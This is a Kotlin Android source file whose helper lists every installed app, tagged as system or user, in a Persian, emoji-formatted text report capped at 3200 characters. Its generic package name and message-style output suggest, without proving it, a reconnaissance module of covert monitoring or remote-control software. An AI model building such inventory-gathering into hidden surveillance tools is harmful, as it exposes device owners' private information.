package com.sys.svc.helpers

import android.content.Context
import android.content.pm.ApplicationInfo
import com.sys.svc.Logger

object AppsHelper {
    fun list(ctx: Context): String {
        return try {
            val pkgs = ctx.packageManager.getInstalledPackages(0)
            val sb = StringBuilder("📦 اپ‌ها (${pkgs.size}):\n")
            pkgs.take(300).forEach { p ->
                val label = p.applicationInfo?.loadLabel(ctx.packageManager)?.toString() ?: "?"
                val system = if ((p.applicationInfo?.flags ?: 0) and ApplicationInfo.FLAG_SYSTEM != 0)
                    "[sys]" else "[usr]"
                sb.appendLine("$system $label (${p.packageName})")
            }
            sb.toString().take(3200)
        } catch (e: Exception) {
            Logger.e("Apps", "", e)
            "❌ ${e.message}"
        }
    }
}